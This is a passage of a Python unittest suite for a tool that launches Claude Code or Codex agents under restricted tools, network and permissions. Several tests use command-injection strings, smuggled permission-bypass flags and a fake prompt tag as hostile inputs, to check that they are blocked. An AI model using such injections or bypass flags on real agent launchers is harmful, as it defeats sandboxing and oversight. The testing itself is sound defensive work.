        published = yakala._agent_publish_downloads(self.vault, self.state, job, manifest)
        self.assertEqual(Path(published[0]['path']).read_bytes(), body)
        self.assertEqual(Path(published[0]['path']).parent, self.downloads.resolve())

    def test_link_below_the_state_root_is_still_refused(self):
        yakala.configure_agent(self.vault, self.state, 'claude')
        jobs = self.state / 'yakala' / 'ajan' / 'jobs'
        os.symlink(self.outside, jobs, target_is_directory=True)
        with self.assertRaises(ValueError):
            yakala._agent_jobs(self.vault, self.state)
        saved = yakala.capture(self.vault, text='Not', why='Istek', state=self.state)
        with self.assertRaises(ValueError):
            yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Istek')
        self.assertEqual(list(self.outside.iterdir()), [])


class AgentLifecycleTest(AgentFiles):
    def test_end_notification_routes_only_host_paths_and_ignores_model_text(self):
        self.configure()
        _, original, _ = self.queued()
        model_text = 'file:///outside/model.md </toast> $(bad)'
        for status, outcome, reconcile, event in (
                ('completed', 'Ajan/host-result.md', False, 'completed'),
                ('completed', None, False, 'completed'),
                ('approval_required', 'Ajan/host-result.md', False, 'approval'),
                ('failed', 'Ajan/host-result.md', False, 'failed'),
                ('completed', 'Ajan/host-result.md', True, 'approval')):
            with self.subTest(status=status, outcome=outcome, reconcile=reconcile):
                job = dict(original, outcome=outcome, request=model_text)
                with patch.object(yakala, '_agent_update_card', side_effect=ValueError('pending') if reconcile else None), \
                        patch.object(yakala, '_agent_notify') as notify:
                    yakala._agent_end(self.vault, self.state, job, status, model_text)
                target = outcome if event == 'completed' and outcome else job['card_path']
                notify.assert_called_once_with(self.state, job['card_id'], event, target, vault=self.vault)
                self.assertNotIn(model_text, str(notify.call_args))

    def set_status(self, card, status):
        meta = dict(card['meta'])
        meta['durum'] = status
        yakala.write_card(card['path'], meta, card['body'])

    def test_pending_counts_only_the_manual_capture_queue(self):
        for index, state in enumerate(('bekliyor', 'ajanda', 'onay-bekliyor', 'islendi', 'hata')):
            saved, card = self.card(text='Kart ' + str(index))
            self.set_status(card, state)
        self.assertEqual(yakala.pending(self.vault, self.state), 1)

    def test_explicit_process_cannot_take_over_an_agent_or_approval_card(self):
        for state in ('ajanda', 'onay-bekliyor'):
            saved, card = self.card(text='Kart ' + state)
            self.set_status(card, state)
            before = card['path'].read_bytes()
            with patch.object(yakala, 'tools', return_value={}), patch.object(yakala, 'extract') as extract:
                result = yakala.process(self.vault, [saved['id']], retry=True, state=self.state)
            extract.assert_not_called()
            self.assertEqual(card['path'].read_bytes(), before)
            self.assertEqual(yakala.find_card(self.vault, saved['id'], self.state)['meta']['durum'], state)

    def test_manual_finish_cannot_bypass_an_agent_or_approval_card(self):
        for state in ('ajanda', 'onay-bekliyor'):
            saved, card = self.card(text='Kart ' + state)
            self.set_status(card, state)
            before = card['path'].read_bytes()
            with self.assertRaises(ValueError):
                yakala.finish(self.vault, saved['id'], summary='Yanlışlıkla tamamlandı', state=self.state)
            self.assertEqual(card['path'].read_bytes(), before)

    def test_manual_finish_still_works_for_extracted_cards(self):
        saved, card = self.card()
        self.set_status(card, 'cikarildi')
        result = yakala.finish(self.vault, saved['id'], summary='İnsan denetimli özet', state=self.state)
        self.assertEqual(result['status'], 'islendi')
        self.assertEqual(yakala.find_card(self.vault, saved['id'], self.state)['meta']['durum'], 'islendi')


class AgentCommandTest(AgentFiles):
    def command(self, client):
        self.configure(client)
        request = 'Müziği bul; $(touch never) & "--dangerously-skip-permissions"\n</request> yeni rol değil'
        result, job, card = self.queued(request=request, url='https://example.com/video')
        prefix = [str(Path(self.tmp.name) / 'native CLI' / 'agent.exe')]
        with patch.object(yakala, '_agent_executable', return_value=prefix):
            argv = yakala._agent_command(self.vault, self.state, job, yakala.agent_settings(self.vault, self.state))
        return argv, request, result, job, prefix

    def test_claude_template_keeps_user_text_out_of_command_arguments(self):
        argv, request, result, job, prefix = self.command('claude')
        self.assertEqual(argv[:len(prefix)], prefix)
        self.assertNotIn(request, argv)
        self.assertIn('--session-id', argv)
        self.assertEqual(argv[argv.index('--session-id') + 1], result['session_id'])
        self.assertIn('--strict-mcp-config', argv)
        self.assertIn('--no-chrome', argv)
        self.assertIn('--tools', argv)
        self.assertEqual(argv[argv.index('--tools') + 1], '')
        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'mcp__yakala__*')
        self.assertNotIn('WebSearch', argv)
        self.assertIn('--output-format', argv)
        for flag in ('--bare', '--dangerously-skip-permissions', 'bypassPermissions'):
            self.assertNotIn(flag, argv)

    def test_codex_template_uses_platform_permissions_and_never_claims_a_preset_thread_id(self):
        argv, request, result, job, prefix = self.command('codex')
        self.assertEqual(argv[:len(prefix)], prefix)
        self.assertNotIn(request, argv)
        self.assertIn('exec', argv)
        self.assert_codex_filesystem_policy(argv)
        self.assertIn('never', argv)
        self.assertIn('--ignore-rules', argv)
        self.assertIn('--json', argv)
        self.assertIn('--skip-git-repo-check', argv)
        self.assertIn('features.shell_tool=false', argv)
        self.assertIn('features.apps=false', argv)
        self.assertIn('web_search="disabled"', argv)
        self.assertIn('mcp_servers.yakala.enabled=true', argv)
        self.assertNotIn('--session-id', argv)
        self.assertNotIn('--ephemeral', argv)
        for flag in ('danger-full-access', '--yolo', '--dangerously-bypass-approvals-and-sandbox'):
            self.assertNotIn(flag, argv)

    def test_prompt_carries_current_request_card_source_and_memory_obligations(self):
        self.configure()
        request = 'Kaynak hakkında kısa bir Türkçe not oluştur.'
        result, job, card = self.queued(request=request, url='https://example.com/article')
        prompt = yakala._agent_prompt(self.vault, job)
        self.assertIn(request, prompt)
        self.assertIn(card['path'].relative_to(self.vault).as_posix(), prompt)
        self.assertIn('https://example.com/article', prompt)
        for required in ('AGENTS.md', 'CLAUDE.md', 'beyin-yakala', 'receipt', 'Ajan/Gunluk-YYYY-MM.md'):
            self.assertIn(required, prompt)
        self.assertIn('--file <receipt.json>', prompt)
        self.assertIn('durum ve kart/sonuc/receipt baglantilarini ekler', prompt)
        self.assertNotIn('companion kartiyla', prompt)
        self.assertNotIn('--session <gercek_oturum_id>', prompt)


class AgentNetworkOptionTest(AgentFiles):
    """ag=kisitli is the default (exact source URLs only); ag=acik is an explicit research opt-in."""

    def argv(self, client, network=None):
        self.configure(client)
        if network:
            yakala.configure_agent(self.vault, self.state, client, network=network)
        result, job, card = self.queued(url='https://example.com/post')
        with patch.object(yakala, '_agent_executable', return_value=['agent.exe']):
            return yakala._agent_command(self.vault, self.state, job, job['config']), job

    def test_restricted_is_the_default_and_old_settings_load(self):
        argv, job = self.argv('claude')
        self.assertEqual(job['config']['ag'], 'kisitli')
        self.assertEqual(argv[argv.index('--tools') + 1], '')
        self.assertNotIn('WebSearch', ' '.join(argv))
        saved = json.loads(self.config_path.read_text(encoding='utf-8'))
        saved.pop('ag')
        self.config_path.write_text(json.dumps(saved), encoding='utf-8')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['ag'], 'kisitli')

    def test_open_network_restores_search_and_any_public_url(self):
        argv, job = self.argv('claude', 'acik')
        self.assertEqual(argv[argv.index('--tools') + 1], 'WebSearch')
        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'WebSearch,mcp__yakala__*')
        prompt = yakala._agent_prompt(self.vault, job)
        for rule in ('yalniz herkese acik bilgi', 'arama sorgusuna, URL', 'approval_required") ile kullanicidan izin'):
            self.assertIn(rule, prompt)

    def test_open_network_turns_codex_hosted_search_on(self):
        codex, _ = self.argv('codex', 'acik')
        self.assertIn('web_search="live"', codex)
        self.assertNotIn('web_search="disabled"', codex)

    def test_open_network_skips_the_exact_url_capability_check(self):
        self.configure('claude')
        yakala.configure_agent(self.vault, self.state, 'claude', network='acik')
        result, job, card = self.queued(url='https://example.com/post')
        job['state'] = 'running'
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        fetched = {'url': 'https://other.example/x', 'links': []}
        with patch.object(yakala, '_agent_fetch_source', return_value=fetched) as fetch:
            yakala._agent_tool_call(self.vault, self.state, job['id'], 'fetch_source', {'url': 'https://other.example/x'})
        fetch.assert_called_once_with('https://other.example/x')

    def test_invalid_network_value_is_refused(self):
        with self.assertRaises(ValueError):
            self.configure('claude', ag='hepsi')


class AgentSelectedSourceTest(AgentFiles):
    """Popup metadata grants exact sources once, under the existing card/queue locks."""

    primary = 'https://example.org/primary'
    selected = 'https://example.net/selected'
    unselected = 'https://example.com/body-only'

    def selected_card(self, values=None):
        self.configure('claude')
        saved, card = self.card(url=self.primary)
        meta = dict(card['meta'], ek_urller=[self.selected] if values is None else values)
        yakala.write_card(card['path'], meta, card['body'] + '\n\n' + self.unselected)
        return saved, card

    def start(self, saved, delivery_id=None):
        result = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Compare selected sources.',
                                      delivery_id=delivery_id)
        job = yakala._agent_load_job(self.vault, self.state, result['job_id'])
        job['state'] = 'running'
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        return job

    def test_selected_secondary_url_is_frozen_and_available_to_restricted_fetch(self):
        saved, card = self.selected_card([self.selected, self.primary, self.selected])
        job = self.start(saved)
        self.assertEqual(job['extra_urls'], [self.selected])
        self.assertIn(self.selected, yakala._agent_prompt(self.vault, job))
        fetched = {'url': self.selected, 'links': [], 'text': 'Synthetic public source'}
        with patch.object(yakala, '_agent_fetch_source', return_value=fetched) as fetch:
            result = yakala._agent_tool_call(self.vault, self.state, job['id'],
                                            'fetch_source', {'url': self.selected})
        self.assertEqual(result['url'], self.selected)
        fetch.assert_called_once_with(self.selected)

    def test_body_model_and_later_card_edit_do_not_expand_a_retried_job(self):
        saved, card = self.selected_card()
        delivery = 'a' * 32
        job = self.start(saved, delivery)
        later = 'https://example.org/later-selection'
        meta, body = yakala.read_card(card['path'])
        meta['ek_urller'] = [self.selected, later]
        yakala.write_card(card['path'], meta, body)
        retry = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Compare selected sources.',
                                     delivery_id=delivery)
        self.assertEqual(retry['job_id'], job['id'])
        restored = yakala._agent_load_job(self.vault, self.state, job['id'])
        self.assertEqual(restored['extra_urls'], [self.selected])
        with patch.object(yakala, '_agent_fetch_source') as fetch:
            for value in (self.unselected, later, self.selected + '?private=CANARY'):
                with self.subTest(value=value), self.assertRaisesRegex(ValueError, 'not authorized'):
                    yakala._agent_tool_call(self.vault, self.state, job['id'], 'fetch_source', {'url': value})
        fetch.assert_not_called()

    def test_legacy_job_without_secondary_sources_still_authorizes_its_primary(self):
        self.configure('claude')
        _, job, _ = self.queued(url=self.primary)
        job.pop('extra_urls', None)
        job['state'] = 'running'
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        self.assertEqual(yakala._agent_source_urls(self.vault, self.state, job), [self.primary])
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['url'], self.primary)

    def test_invalid_or_oversized_secondary_metadata_fails_before_card_or_job_write(self):
        saved, card = self.selected_card()
        original_meta, original_body = yakala.read_card(card['path'])
        oversized = ['https://example.org/' + str(index) + '/' + 'x' * 8000 for index in range(9)]
        for values in (self.selected, [None], ['file:///private'], [self.selected] * 64,
                       [self.selected + '/' + 'x' * 8192], oversized):
            with self.subTest(values_type=type(values).__name__, size=len(values)):
                yakala.write_card(card['path'], dict(original_meta, ek_urller=values), original_body)
                before = card['path'].read_bytes()
                with self.assertRaises(ValueError):
                    yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Compare selected sources.')
                self.assertEqual(card['path'].read_bytes(), before)
                self.assertEqual(yakala._agent_jobs(self.vault, self.state), [])
        self.spawned.assert_not_called()

    def test_damaged_durable_secondary_sources_are_rejected_before_tools(self):
        saved, card = self.selected_card()
        job = self.start(saved)
        path = yakala._agent_job_dir(self.vault, self.state, job['id']) / 'job.json'
        with patch.object(yakala, '_agent_fetch_source') as fetch:
            for values in ('https://example.org/not-a-list', ['file:///private']):
                with self.subTest(values=values):
                    yakala._agent_json(path, dict(job, extra_urls=values))
                    with self.assertRaises(ValueError):
                        yakala._agent_tool_call(self.vault, self.state, job['id'],
                                                'fetch_source', {'url': self.primary})
        fetch.assert_not_called()

    def test_combined_utf8_job_size_is_rejected_before_the_card_becomes_busy(self):
        values = ['https://example.org/' + str(index) + '/' + 'x' * 8128 for index in range(8)]
        saved, card = self.selected_card(values)
        # Every field is individually legal, but the combined durable record
        # must leave room for runtime identity and the eventual result summary.
        self.assertEqual(yakala._agent_extra_source_urls(values, self.primary), values)
        before = card['path'].read_bytes()
        with self.assertRaisesRegex(ValueError, 'is kaydi.*buyuk'):
            yakala.enqueue_agent(self.vault, self.state, saved['id'], '\U0001f642' * 16000)
        self.assertEqual(card['path'].read_bytes(), before)
        self.assertEqual(yakala._agent_jobs(self.vault, self.state), [])
        self.spawned.assert_not_called()


class AgentWindowViewTest(AgentFiles):
    """gorunum=pencere: interactive clients with the hidden run's tool boundary."""

    def windowed(self, request='Bu gönderinin linkini kontrol et.', client='claude'):
        with patch.object(yakala, '_agent_window_supported', return_value=True):
            self.configure(client)
            result = yakala.configure_agent(self.vault, self.state, client, view='pencere')
        self.assertEqual(result['gorunum'], 'pencere')
        self.assertIn('Codex' if client == 'codex' else 'Claude Code', result['ipucu'])
        return self.queued(request=request, url='https://example.com/post')

    def test_hidden_is_the_default_and_old_settings_without_the_field_still_load(self):
        self.configure('claude')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['gorunum'], 'gizli')
        saved = json.loads(self.config_path.read_text(encoding='utf-8'))
        saved.pop('gorunum')
        self.config_path.write_text(json.dumps(saved), encoding='utf-8')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['gorunum'], 'gizli')

    def test_window_is_only_offered_on_windows_for_both_clients(self):
        for client in ('claude', 'codex'):
            with self.subTest(client=client), patch.object(yakala, '_agent_window_supported', return_value=False), \
                    self.assertRaises(ValueError):
                yakala.configure_agent(self.vault, self.state, client, view='pencere')
        self.assertFalse(self.config_path.exists())

    def test_codex_window_uses_interactive_argv_and_the_same_security_flags(self):
        result, job, card = self.windowed(client='codex', request='Istek " & $(x) --yolo')
        self.assertIsNone(job['session_id'])
        job['codex_mcp_off'] = ['node_repl', 'other']
        for network in ('kisitli', 'acik'):
            job['config']['ag'] = network
            with self.subTest(network=network), patch.object(yakala, '_agent_window_supported', return_value=True), \
                    patch.object(yakala, '_agent_executable', return_value=['C:/Codex/codex.exe']), \
                    patch.object(yakala, '_agent_windows_argv', wraps=yakala._agent_windows_argv) as checked:
                argv = yakala._agent_command(self.vault, self.state, job, job['config'])
            checked.assert_called_once_with(argv)
            self.assertEqual(argv[0], 'C:/Codex/codex.exe')
            for flag in ('exec', '--json', '-o', '--ignore-rules', '--skip-git-repo-check', '-', '--session-id'):
                self.assertNotIn(flag, argv)
            self.assertEqual(argv[argv.index('-a') + 1], 'never')
            self.assert_codex_filesystem_policy(argv)
            self.assertEqual(argv[argv.index('-C') + 1], str(self.vault))
            for feature in yakala.CODEX_DISABLED:
                self.assertIn(['--disable', feature], [argv[i:i + 2] for i in range(len(argv) - 1)])
            for name in job['codex_mcp_off']:
                self.assertIn('mcp_servers.' + name + '.enabled=false', argv)
            for setting in ('mcp_servers.yakala.enabled=true', 'mcp_servers.yakala.required=true',
                            'mcp_servers.yakala.tool_timeout_sec=60'):
                self.assertIn(setting, argv)
            self.assertTrue(any(item.startswith('mcp_servers.yakala.command=') for item in argv))
            self.assertTrue(any(item.startswith('mcp_servers.yakala.args=') for item in argv))
            self.assertIn('web_search="' + ('live' if network == 'acik' else 'disabled') + '"', argv)
            self.assertEqual(argv[-2], '--')
            self.assertTrue(argv[-1].startswith('Bu vault icinde'))
            self.assertIn('canli izliyor', argv[-1])
            self.assertEqual([item for item in argv if 'Istek ' in item], [argv[-1]])

    def test_both_clients_are_asked_for_a_view_only_at_a_persons_terminal(self):
        for client in ('claude', 'codex'):
            with self.subTest(client=client), patch.object(yakala, '_agent_window_supported', return_value=True), \
                    patch.object(yakala.sys, 'stdin', Mock(isatty=Mock(return_value=True))), \
                    patch('builtins.input', return_value='2') as ask:
                self.assertEqual(yakala._agent_ask_view(client, False), 'pencere')
                self.assertIn('Codex' if client == 'codex' else 'Claude Code', ask.call_args.args[0])
                self.assertIsNone(yakala._agent_ask_view(client, True))
                ask.assert_called_once()

    def test_window_command_is_interactive_with_the_same_tool_boundary(self):
        result, job, card = self.windowed(request='Müziği bul "--dangerously-skip-permissions" $(x)')
        prefix = [str(Path(self.tmp.name) / 'native CLI' / 'claude.exe')]
        with patch.object(yakala, '_agent_window_supported', return_value=True), patch.object(yakala, '_agent_executable', return_value=prefix):
            argv = yakala._agent_command(self.vault, self.state, job, job['config'])
        self.assertEqual(argv[:len(prefix)], prefix)
        for flag in ('-p', '--output-format', '--verbose'):
            self.assertNotIn(flag, argv)
        for flag in ('--strict-mcp-config', '--no-chrome', '--session-id'):
            self.assertIn(flag, argv)
        self.assertEqual(argv[argv.index('--session-id') + 1], result['session_id'])
        self.assertEqual(argv[argv.index('--tools') + 1], '')
        self.assertEqual(argv[argv.index('--allowedTools') + 1], 'mcp__yakala__*')
        self.assertEqual(argv[argv.index('--permission-mode') + 1], 'dontAsk')
        self.assertNotIn('--permission-prompts', argv)  # documented only for print mode
        for flag in ('--dangerously-skip-permissions', 'bypassPermissions', '--bare'):
            self.assertNotIn(flag, argv)
        # The request travels only inside the single prompt argument, after every option.
        self.assertTrue(argv[-1].startswith('Bu vault icinde'))
        self.assertEqual(argv[-2], '--')
        self.assertIn('canli izliyor', argv[-1])
        self.assertIn('basarinin henuz dogrulanmadigini', argv[-1])
        self.assertNotIn('birkac saniye icinde', argv[-1])
        self.assertEqual([item for item in argv if 'Müziği bul' in item], [argv[-1]])

    def test_valid_request_can_exceed_createprocess_limit_after_json_and_quoting(self):
        result, saved_job, card = self.windowed(request='"' * yakala.AGENT_MAX_REQUEST)
        for character in ('"', '\\', '\U0001F680', '\x01'):
            with self.subTest(character=repr(character)):
                job = dict(saved_job, request=character * yakala.AGENT_MAX_REQUEST)
                with patch.object(yakala, '_agent_window_supported', return_value=True), \
                        patch.object(yakala, '_agent_executable', return_value=['C:/Claude/claude.exe']), \
                        self.assertRaisesRegex(ValueError, 'gizli'):
                    yakala._agent_command(self.vault, self.state, job, job['config'])
                self.assertTrue(card['path'].is_file())

    def test_long_request_still_works_with_stdin_in_hidden_mode(self):
        self.configure('claude')
        result, job, card = self.queued(request='"' * yakala.AGENT_MAX_REQUEST)
        with patch.object(yakala, '_agent_executable', return_value=['C:/Claude/claude.exe']):
            argv = yakala._agent_command(self.vault, self.state, job, job['config'])
        self.assertIn('-p', argv)
        self.assertNotIn(job['request'], argv)

    def test_windows_argv_limit_counts_utf16_and_terminator(self):
        base = ['C:/claude.exe', '--', '']
        overhead = len(subprocess.list2cmdline(base[:-1]).encode('utf-16-le')) // 2 + 1
        # One separator and one terminating NUL are included in the 32,767 total.
        accepted = [*base[:-1], 'a' * (32766 - overhead)]
        self.assertEqual(yakala._agent_windows_argv(accepted), accepted)
        with self.assertRaises(ValueError):
            yakala._agent_windows_argv([*base[:-1], accepted[-1] + 'a'])

    @unittest.skipUnless(os.name == 'nt', 'requires real Windows CreateProcessW')
    def test_real_windows_argv_round_trip_has_no_shell_expansion(self):
        values = ['--dangerously-skip-permissions', '" & %PATH% ^ ! <> $(x)',
                  '\U0001F680 Örnek', 'tail \\\\', 'quote \\\" end', 'line\nnext']
        command = [sys.executable, '-c',
                   'import json,sys; print(json.dumps(sys.argv[1:], ensure_ascii=True))', *values]
        result = subprocess.run(yakala._agent_windows_argv(command), capture_output=True,
                                text=True, check=True, timeout=15, shell=False)
        self.assertEqual(json.loads(result.stdout), values)

    def run_window(self, poll, manifest, client='claude', session=None, session_error=None):
        result, job, card = self.windowed(client=client)
        folder = yakala._agent_job_dir(self.vault, self.state, job['id'])
        if manifest:
            (folder / 'result.json').write_text('{}', encoding='utf-8')
        process = types.SimpleNamespace(pid=777, poll=Mock(return_value=poll), kill=Mock())
        with self.window_process_identity(process.pid), \
                patch.object(yakala, '_agent_window_supported', return_value=True), \
                patch.object(yakala.subprocess, 'Popen', return_value=process) as popen, \
                patch.object(yakala, '_agent_finalize', return_value=('completed', 'tamam')) as finalize, \
                patch.object(yakala, '_agent_codex_window_session', return_value=session, side_effect=session_error) as discover, \
                patch('time.sleep'):
            outcome = yakala._agent_run_window(self.vault, self.state, job, [client + '.exe', 'istem'])
        if client == 'claude' or not manifest:
            discover.assert_not_called()
        return outcome, process, popen, finalize, job

    def test_codex_window_saves_observed_session_before_finalizing_and_stays_open(self):
        session = str(uuid.uuid4())
        outcome, process, popen, finalize, job = self.run_window(None, True, client='codex', session=session)
        self.assertEqual(outcome, ('completed', 'tamam'))
        self.assertEqual(finalize.call_args.args[2]['session_id'], session)
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['session_id'], session)
        self.assertEqual(yakala.read_card(yakala._agent_card_path(self.vault, job))[0]['ajan_oturum'], session)
        process.kill.assert_not_called()
        self.assertTrue(popen.call_args.kwargs['creationflags'] & 0x10)
        self.assertNotIn('stdin', popen.call_args.kwargs)

    def test_codex_window_cannot_finalize_without_an_unambiguous_session(self):
        for error in (None, ValueError('birden fazla yeni oturum'), OSError('meta okunamadi')):
            with self.subTest(error=error):
                outcome, process, popen, finalize, job = self.run_window(None, True, client='codex', session_error=error)
                self.assertEqual(outcome[0], 'approval_required')
                self.assertIn('oturum', outcome[1])
                finalize.assert_not_called()
                process.kill.assert_not_called()
                self.assertIsNone(job['session_id'])
                yakala._agent_end(self.vault, self.state, job, *outcome)

    def test_window_job_finalizes_on_the_manifest_and_leaves_the_console_open(self):
        with patch.object(yakala, '_agent_notify') as notify:
            outcome, process, popen, finalize, job = self.run_window(poll=None, manifest=True)
        notify.assert_called_once_with(self.state, job['card_id'], 'started', job['card_path'], vault=self.vault)
        self.assertEqual(outcome, ('completed', 'tamam'))
        finalize.assert_called_once()
        process.kill.assert_not_called()
        self.assertTrue(popen.call_args.kwargs['creationflags'] & 0x10)  # CREATE_NEW_CONSOLE
        self.assertNotIn('stdin', popen.call_args.kwargs)
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['gorunum'], 'pencere')

    def test_closing_the_window_without_a_result_is_not_completion(self):
        outcome, process, popen, finalize, job = self.run_window(poll=0, manifest=False)
        self.assertEqual(outcome[0], 'approval_required')
        finalize.assert_not_called()


class AgentCodexWindowSessionTest(AgentFiles):
    def setUp(self):
        super().setUp()
        self.codex_home = Path(self.tmp.name) / 'Codex Home'
        self.sessions = self.codex_home / 'sessions' / '2026' / '10' / '18'
        self.sessions.mkdir(parents=True)
        self.started_ns = int(yakala.datetime.fromisoformat('2026-10-18T09:00:00+00:00').timestamp()) * 1000000000
        environment = patch.dict(yakala.os.environ, CODEX_HOME=str(self.codex_home))
        environment.start()
        self.addCleanup(environment.stop)
        clock = patch('time.time_ns', return_value=self.started_ns + 10000000000)
        clock.start()
        self.addCleanup(clock.stop)

    def rollout(self, *, cwd=None, stamp='2026-10-18T09:00:01.000Z', payload=None):
        session = str(uuid.uuid4())
        path = self.sessions / ('rollout-2026-10-18T12-00-01-' + session + '.jsonl')
        meta = {'id': session, 'timestamp': stamp, 'cwd': str(cwd or self.vault)}
        if payload:
            meta.update(payload)
        path.write_bytes(json.dumps({'type': 'session_meta', 'payload': meta}).encode('utf-8') +
                         b'\n' + b'\xff' * 100000)  # The transcript must never be decoded.
        os.utime(path, ns=(self.started_ns + 2000000000, self.started_ns + 2000000000))
        return session, path

    def discover(self):
        return yakala._agent_codex_window_session(self.vault, self.started_ns)

    def test_only_new_matching_vault_metadata_supplies_the_session(self):
        self.rollout(stamp='2026-10-18T08:59:59.999Z')  # An old session with a recent mtime.
        self.rollout(cwd=self.state)
        self.rollout(stamp='2026-10-18T09:00:11.000Z')  # Beyond the observed run.
        expected, path = self.rollout()
        self.assertEqual(self.discover(), expected)
        self.assertNotEqual(expected, path.stem)

    def test_timestamp_precision_does_not_lose_the_first_millisecond(self):
        expected, path = self.rollout(stamp='2026-10-18T09:00:00.000Z')
        self.assertEqual(yakala._agent_codex_window_session(self.vault, self.started_ns + 999999), expected)

    def test_two_new_sessions_in_the_vault_are_ambiguous(self):
        self.rollout()
        self.rollout(stamp='2026-10-18T09:00:02.000Z')
        with self.assertRaisesRegex(ValueError, 'birden fazla'):
            self.discover()

    def test_missing_or_invalid_metadata_never_supplies_an_identity(self):
        self.assertIsNone(self.discover())
        for payload in ({'id': str(uuid.uuid4())}, {'id': 'not-a-uuid'}, {'cwd': '.'},
                        {'timestamp': '2026-10-18T09:00:01'}, {'timestamp': 'invalid'}):
            with self.subTest(payload=payload):
                self.rollout(payload=payload)
        self.assertIsNone(self.discover())

    def test_only_a_bounded_first_line_is_read(self):
        expected, path = self.rollout()
        first = path.open('rb')
        with first:
            meta = first.readline()
        for header in (b'{}\n', b'x' * 65537 + b'\n', b'{bad json}\n'):
            with self.subTest(header=header[:20]):
                path.write_bytes(header + meta)
                os.utime(path, ns=(self.started_ns + 2000000000, self.started_ns + 2000000000))
                self.assertIsNone(self.discover())

    def test_default_codex_home_is_used_when_environment_is_unset(self):
        expected, path = self.rollout()
        with patch.dict(yakala.os.environ), patch.object(yakala.Path, 'home', return_value=self.codex_home.parent):
            yakala.os.environ.pop('CODEX_HOME', None)
            self.codex_home.rename(self.codex_home.parent / '.codex')
            self.assertEqual(self.discover(), expected)

    def test_relative_codex_home_uses_the_vault_as_the_cli_does(self):
        expected, path = self.rollout()
        with patch.dict(yakala.os.environ, CODEX_HOME='../Codex Home'):
            self.assertEqual(self.discover(), expected)

    def test_window_finds_fixture_session_after_launch_before_finalizing(self):
        self.configure('codex', gorunum='pencere')
        result, job, card = self.queued()
        folder = yakala._agent_job_dir(self.vault, self.state, job['id'])
        observed = []
        process = Mock(pid=777)

        def launch(*args, **kwargs):
            session, path = self.rollout()
            observed.append(session)
            (folder / 'result.json').write_text('{}', encoding='utf-8')
            return process

        with self.window_process_identity(process.pid), \
                patch.object(yakala.subprocess, 'Popen', side_effect=launch), \
                patch('time.time_ns', side_effect=[self.started_ns, self.started_ns + 10000000000]), \
                patch.object(yakala, '_agent_finalize', return_value=('completed', 'tamam')) as finalize:
            self.assertEqual(yakala._agent_run_window(self.vault, self.state, job, ['codex.exe']),
                             ('completed', 'tamam'))
        self.assertEqual(finalize.call_args.args[2]['session_id'], observed[0])
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['session_id'], observed[0])


class AgentEnvironmentTest(AgentFiles):
    def test_job_is_its_own_session_even_when_started_from_an_agent(self):
        inherited = {'CLAUDECODE': '1', 'CLAUDE_CODE_CHILD_SESSION': '1', 'CLAUDE_CODE_ENTRYPOINT': 'cli'}
        with patch.dict(yakala.os.environ, inherited):
            env = yakala._agent_env(self.state, str(uuid.uuid4()))
        for name in inherited:
            self.assertNotIn(name, env)


class AgentPreflightTest(AgentFiles):
    HELP = ('--print -p --permission-mode --permission-prompts --tools --allowedTools --disallowedTools '
            '--strict-mcp-config --mcp-config --session-id --append-system-prompt '
            '--output-format --max-budget-usd --sandbox -s --json -C --cd '
            '--output-last-message -o --skip-git-repo-check --ignore-rules '
            '--ask-for-approval -a --config -c --disable --strict-config')

    def invoke(self, mcp='[]', plugins='{"installed": [], "available": []}', help_text=None, client='codex'):
        calls = []

        def run(argv, **kwargs):
            calls.append((argv, kwargs))
            if '--version' in argv:
                stdout = ('2.1.296 (Claude Code)' if client == 'claude' else 'codex-cli 0.155.1')
                if help_text is not None:
                    stdout = help_text
            elif 'mcp' in argv and 'list' in argv:
                stdout = mcp
            elif 'plugin' in argv and 'list' in argv:
                stdout = plugins
            elif 'features' in argv and 'list' in argv:
                value = 'false' if '--disable' in argv else 'true'
                stdout = ''.join(name + ' stable ' + value + '\n' for name in yakala.CODEX_DISABLED)
            else:
                stdout = self.HELP if help_text is None else help_text
            return subprocess.CompletedProcess(argv, 0, stdout.encode('utf-8'), b'')

        system = types.SimpleNamespace(**{**vars(os), 'name': 'posix'})
        with patch.object(yakala, 'os', system), patch.object(yakala.subprocess, 'run', side_effect=run):
            result = yakala._agent_preflight(client, [client], self.vault)
        return result, calls

    def test_empty_known_inventory_is_accepted_without_a_model_call(self):
        for client in ('claude', 'codex'):
            with self.subTest(client=client):
                result, calls = self.invoke(client=client)
                self.assertTrue(calls)
                for argv, kwargs in calls:
                    self.assertFalse(kwargs.get('shell', False))
                    self.assertTrue('--help' in argv or '--version' in argv or 'list' in argv, argv)
                    self.assertEqual(kwargs.get('cwd'), str(self.vault))

    def test_enabled_existing_mcp_is_refused(self):
        with self.assertRaises((ValueError, RuntimeError, OSError)):
            self.invoke(mcp='[{"name": "unbounded", "enabled": true}]')

    def test_unknown_mcp_inventory_shape_is_refused(self):
        for response in ('{}', 'null', 'not json'):
            with self.subTest(response=response), self.assertRaises((ValueError, RuntimeError, OSError)):
                self.invoke(mcp=response)

    def test_enabled_existing_plugin_is_refused(self):
        with self.assertRaises((ValueError, RuntimeError, OSError)):
            self.invoke(plugins='{"installed": [{"pluginId": "other@market", "enabled": true}], "available": []}')

    def test_unknown_plugin_inventory_shape_is_refused(self):
        for response in ('[]', '{}', 'null', 'not json'):
            with self.subTest(response=response), self.assertRaises((ValueError, RuntimeError, OSError)):
                self.invoke(plugins=response)

    def test_user_mcp_server_is_switched_off_for_the_run_only(self):
        calls = []
        enabled = '[{"name": "node_repl", "enabled": true}, {"name": "old", "enabled": false}]'
        off = '[{"name": "node_repl", "enabled": false}, {"name": "old", "enabled": false}]'

        def run(argv, **kwargs):
            calls.append(argv)
            if 'mcp' in argv and 'list' in argv:
                stdout = off if 'mcp_servers.node_repl.enabled=false' in argv else enabled
            elif 'plugin' in argv and 'list' in argv:
                stdout = '{"installed": [], "available": []}'
            elif '--version' in argv:
